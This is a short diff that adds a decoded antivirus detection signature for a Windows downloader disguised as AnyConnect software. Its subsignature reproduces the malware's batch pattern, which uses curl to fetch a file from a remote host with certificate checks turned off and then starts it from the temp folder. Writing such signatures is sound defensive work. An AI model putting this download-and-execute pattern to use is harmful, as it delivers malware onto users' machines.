@@ -1,0 +1,8 @@
+VIRUS NAME: Win.Downloader.FakeAnyConnect-10016345-1
+TDB: Engine:90-255,Container:CL_TYPE_NULSFT,Target:0
+LOGICAL EXPRESSION: 0
+ * SUBSIG ID 0
+ +-> OFFSET: ANY
+ +-> SIGMOD: WIDE
+ +-> DECODED SUBSIGNATURE:
+for /f %%i in ('curl -{WILDCARD_ANY_STRING(LENGTH>=6&&<=14)} %%{filename_effective} --output-dir %tmp% -k https://{WILDCARD_ANY_STRING(LENGTH>=16)}/UKEE80L') do (IF EXIST %tmp%\%%i (start %tmp%\%%i))
